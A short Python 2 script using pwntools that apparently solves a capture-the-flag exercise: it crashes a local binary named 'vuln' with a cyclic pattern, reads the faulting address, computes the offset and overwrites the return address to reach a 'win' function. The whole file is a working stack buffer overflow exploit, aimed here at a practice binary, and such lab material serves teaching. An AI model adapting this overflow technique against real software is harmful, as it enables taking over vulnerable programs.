#!/usr/bin/env python2
from pwn import *
import re

# Load binary
binary = ELF('./vuln')

# Find win function address
win_address = p32(binary.symbols['win'])

# Create payload
pattern = cyclic(512)

# Run executable
io = process('./vuln')

# Send it to the executable
log.info('Sending generated payload to the executable')
io.sendline(pattern)

# Read binary output
output = io.read()

# Extract jump address
address_regex = re.compile(r'0x[0-9a-fA-F]{1,100}')
jump_address = re.search(address_regex, output).group(0)
log.info('Binary tried to jump to %s' % jump_address)

exploit = cyclic(cyclic_find(p32(int(jump_address, 0))))
exploit += win_address

log.info('Relaunching process with crafted exploit')
io = process('./vuln')
io.sendline(exploit)
print(io.read())
